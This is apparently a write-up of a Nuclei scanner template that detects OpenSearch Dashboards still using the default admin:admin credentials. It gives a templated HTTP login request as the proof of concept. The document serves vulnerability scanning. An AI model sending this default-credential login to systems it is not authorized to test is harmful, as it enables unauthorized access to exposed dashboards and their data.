# Nuclei Template: OpenSearch Dashboard - Default Login
**Template ID:** opensearch-dashboard-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`opensearch-default-login.yaml`)

## Vulnerability Information & PoC

## Description
OpenSearch Dashboard is a community-driven, open source search and analytics suite. This template detects instances using default credentials (admin:admin).

## Steps to reproduce / Exploit Payload
```http
POST /auth/login HTTP/1.1
Host: {{Hostname}}
osd-xsrf: osd-fetch
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://opensearch.org/docs/latest/security/access-control/users-roles/
- https://github.com/opensearch-project/OpenSearch-Dashboards
